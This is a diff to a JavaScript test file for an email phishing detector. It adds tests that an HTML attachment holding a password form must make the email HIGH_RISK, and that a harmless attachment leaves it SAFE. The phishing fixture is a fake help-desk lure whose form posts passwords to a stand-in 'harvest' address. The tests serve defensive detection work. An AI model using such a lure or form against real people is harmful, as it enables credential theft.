@@ -22,6 +22,9 @@ function buildRaw(lines, body) {
 }
 
 /** Runs the offline portion of the pipeline: parse -> normalize -> analyze -> rules -> score. */
+/** Built from character codes, so no layer of escaping can quietly eat it. */
+const CRLF = String.fromCharCode(13, 10);
+
 async function runPipeline(raw, authentication) {
     const parsedEmail = await emailParser.parse(raw);
     let threatObject = mqlBridge.normalize(parsedEmail, null, raw);
@@ -150,6 +153,93 @@ test('executable attachment is detected and hashed without being executed', asyn
     assert.ok(ruleIds.includes('MQL-ATT-101'), 'executable-class extension should match');
     assert.ok(ruleIds.includes('MQL-ATT-103'), 'double extension should match');
     assert.ok(result.iocs.hashes.includes(result.attachments[0].sha256), 'attachment hash should be an IOC');
+});
+
+/**
+ * What is found inside an attachment has to reach the verdict.
+ *
+ * It did not. The inspector reported a HIGH finding on an HTML attachment
+ * carrying a sign-in form, and the message came back SAFE, because nothing
+ * downstream read attachments at all. A finding that reaches nobody is the same
+ * as a finding that was never made.
+ */
+test('a credential form inside an attachment decides the verdict', async () => {
+    const page = Buffer.from(
+        '<html><body><h2>Your session expired</h2>' +
+        '<form action="https://198.51.100.9/harvest" method="post">' +
+        '<input type="password" name="p"></form></body></html>'
+    ).toString('base64');
+
+    const raw = [
+        'From: "IT Service Desk" <helpdesk@supplier-portal.example>',
+        'To: employee@company.example',
+        'Subject: Reconfirm your access',
+        'Message-ID: <attachment-verdict@supplier-portal.example>',
+        'Content-Type: multipart/mixed; boundary="B"',
+        '',
+        '--B',
+        'Content-Type: text/plain',
+        '',
+        'Please reconfirm your access using the attached form.',
+        '--B',
+        'Content-Type: text/html; name="reconfirm-access.html"',
+        'Content-Transfer-Encoding: base64',
+        'Content-Disposition: attachment; filename="reconfirm-access.html"',
+        '',
+        page,
+        '--B--'
+    ].join(CRLF);
+
+    // Authentication passes. Nothing about the headers is wrong, which is the
+    // point: the entire attack is inside the attachment.
+    const result = await runPipeline(raw, PASSING_AUTH);
+
+    assert.strictEqual(result.detection.verdict, 'HIGH_RISK',
+        'an emailed sign-in page that posts a password offsite cannot come back SAFE');
+
+    const attachmentEvidence = result.evidence.filter(e => e.evidence_type === 'ATTACHMENT_CONTENT');
+    assert.ok(attachmentEvidence.length, 'the finding must appear in the evidence, not only on the attachment');
+
+    // The floor that carried it there has to be visible in the reasoning rather
+    // than applied silently.
+    const decisive = result.confidence.contributions.find(c => c.family === 'DECISIVE_FINDING');
+    assert.ok(decisive, 'the reason this reached high risk must appear in the contributions');
+});
+
+test('an attachment with nothing wrong with it does not move the verdict', async () => {
+    const notes = Buffer.from(
+        '<html><body><p>Notes from the call are below. Thursday works for me.</p></body></html>'
+    ).toString('base64');
+
+    const raw = [
+        'From: "Priya Raman" <priya.raman@partner.example>',
+        'To: employee@company.example',
+        'Subject: Notes from Tuesday',
+        'Message-ID: <benign-attachment@partner.example>',
+        'Date: Mon, 1 Sep 2026 10:00:00 +0000',
+        'Content-Type: multipart/mixed; boundary="B"',
+        '',
+        '--B',
+        'Content-Type: text/plain',
+        '',
+        'Notes attached, as promised. Let me know if Thursday still works for you.',
+        '--B',
+        'Content-Type: text/html; name="notes.html"',
+        'Content-Transfer-Encoding: base64',
+        'Content-Disposition: attachment; filename="notes.html"',
+        '',
+        notes,
+        '--B--'
+    ].join(CRLF);
+
+    const result = await runPipeline(raw, PASSING_AUTH);
+
+    assert.strictEqual(result.detection.verdict, 'SAFE',
+        'inspecting attachment contents must not make ordinary attachments suspicious');
+    assert.deepStrictEqual(
+        result.evidence.filter(e => e.evidence_type === 'ATTACHMENT_CONTENT'), [],
+        'an unremarkable attachment contributes no evidence'
+    );
 });
 
 test('ordinary business correspondence is not flagged as a threat', async () => {
